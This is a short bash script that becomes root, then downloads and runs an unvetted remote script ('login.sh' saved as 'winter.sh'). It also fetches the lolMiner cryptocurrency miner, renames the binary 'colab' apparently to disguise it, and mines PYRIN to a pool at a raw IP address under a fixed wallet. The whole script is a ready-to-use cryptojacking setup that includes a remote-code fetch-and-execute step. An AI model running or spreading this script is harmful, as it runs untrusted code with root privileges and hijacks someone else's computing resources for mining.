#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
apt-get -y install screen && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.81/lolMiner_v1.81_Lin64.tar.gz && tar -xvf lolMiner_v1.81_Lin64.tar.gz && cd 1.81 && mv lolMiner colab
EOF

screen


./1.81/colab --algo PYRIN --pool 47.236.130.246:80 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --pass x --no-cl



